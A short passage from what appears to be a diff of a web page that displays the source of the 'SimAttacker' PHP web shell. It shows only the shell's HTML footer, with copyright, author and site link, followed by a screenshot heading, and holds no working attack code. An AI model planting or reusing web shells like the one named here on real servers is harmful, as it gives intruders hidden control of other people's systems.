+<span class="x">            &amp;lt;p align=&quot;center&quot;&amp;gt;&amp;lt;font color=&quot;#666666&quot; size=&quot;1&quot; face=&quot;Tahoma&quot;&amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="x">            Copyright 2004-Simorgh Security&amp;lt;br&amp;gt;</span>
+<span class="x">            Hossein-Asgari&amp;lt;br&amp;gt;</span>
+<span class="x">            &amp;lt;/font&amp;gt;&amp;lt;font color=&quot;#c0c0c0&quot; size=&quot;1&quot; face=&quot;Tahoma&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;a style=&quot;TEXT-DECORATION: none&quot; href=&quot;http://www.simorgh-ev.com&quot;&amp;gt;</span>
+<span class="x">        &amp;lt;font color=&quot;#666666&quot;&amp;gt;www.simorgh-ev.com&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;</span>
+<span class="x">        &amp;lt;/tr&amp;gt;</span>
+<span class="x">    &amp;lt;/table&amp;gt;</span>
+<span class="x">&amp;lt;/div&amp;gt;</span>
 
-&lt;/body&gt;
+<span class="x">&amp;lt;/body&amp;gt;</span>
 
-&lt;/html&gt;
-</pre>
+<span class="x">&amp;lt;/html&amp;gt;</span></code></pre></div>
 
 <h3>SimAttacker Shell screenshot<figure id="attachment_409" style="width: 604px;" class="wp-caption aligncenter"></h3>
 
